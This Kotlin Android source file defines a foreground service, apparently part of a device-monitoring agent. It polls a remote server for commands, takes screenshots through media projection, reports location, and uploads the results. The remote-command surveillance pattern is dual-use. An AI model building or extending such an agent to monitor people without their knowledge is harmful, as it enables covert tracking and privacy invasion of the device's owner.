package org.hullas.agent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class HullasService : Service() {
    private val tag = "HullasService"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        startForegroundNotify()
        startPolling()
        Log.i(tag, "Service started")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int =
        START_STICKY

    override fun onDestroy() {
        isRunning = false
        pollJob?.cancel()
        scope.cancel()
        Log.i(tag, "Service stopped")
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startForegroundNotify() {
        val channelId = "hullas_monitor"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                channelId,
                getString(R.string.notif_title),
                NotificationManager.IMPORTANCE_LOW,
            )
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }

        setForegroundMode(screenshot = false)
    }

    private fun startPolling() {
        pollJob?.cancel()
        pollJob = scope.launch {
            val api = ApiClient(this@HullasService)
            val executor = CommandExecutor(this@HullasService)
            var beat = 0
            while (isActive) {
                try {
                    if (beat % 6 == 0) {
                        api.heartbeat()
                        Prefs.setLastHeartbeat(this@HullasService)
                    }
                    beat++
                    val cmd = api.poll()
                    if (cmd != null) {
                        Log.i(tag, "Buyruq: ${cmd.cmd}")
                        handleCommand(api, executor, cmd)
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Poll xato", e)
                }
                delay(10_000)
            }
        }
    }

    private fun buildNotification(): Notification {
        val channelId = "hullas_monitor"
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT,
        )
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle(getString(R.string.notif_title))
            .setContentText(getString(R.string.notif_text))
            .setSmallIcon(R.drawable.ic_stat)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
    }

    private fun setForegroundMode(screenshot: Boolean) {
        val notification = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                val type = if (screenshot) {
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                } else {
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                }
                startForeground(NOTIF_ID, notification, type)
            } else {
                startForeground(NOTIF_ID, notification)
            }
        } catch (e: Exception) {
            Log.e(tag, "setForegroundMode", e)
            startForeground(NOTIF_ID, notification)
        }
    }

    private suspend fun handleCommand(
        api: ApiClient,
        executor: CommandExecutor,
        cmd: Command,
    ) {
        if (cmd.cmd == "screenshot") setForegroundMode(screenshot = true)
        val result = try {
            executor.execute(cmd)
        } finally {
            if (cmd.cmd == "screenshot") setForegroundMode(screenshot = false)
        }
        result.onSuccess { file ->
            if (cmd.cmd == "location") return@onSuccess
            if (file != null) {
                api.sendResult(cmd.id, "done", file = file)
                file.delete()
            } else {
                api.sendResult(cmd.id, "failed", error = "Fayl yaratilmadi")
            }
        }.onFailure { e ->
            when {
                e is LocationException && e.coords != null -> api.sendResult(
                    cmd.id, "done",
                    lat = e.coords.first, lon = e.coords.second,
                )
                e is ScreenshotException -> {
                    api.sendResult(cmd.id, "failed", error = e.message)
                    ProjectionHelper.requestPermission(this)
                }
                else -> api.sendResult(cmd.id, "failed", error = e.message ?: "xato")
            }
        }
    }

    companion object {
        const val NOTIF_ID = 100
        @Volatile var isRunning = false

        fun start(ctx: android.content.Context) {
            val i = Intent(ctx, HullasService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(i)
            } else {
                ctx.startService(i)
            }
        }
    }
}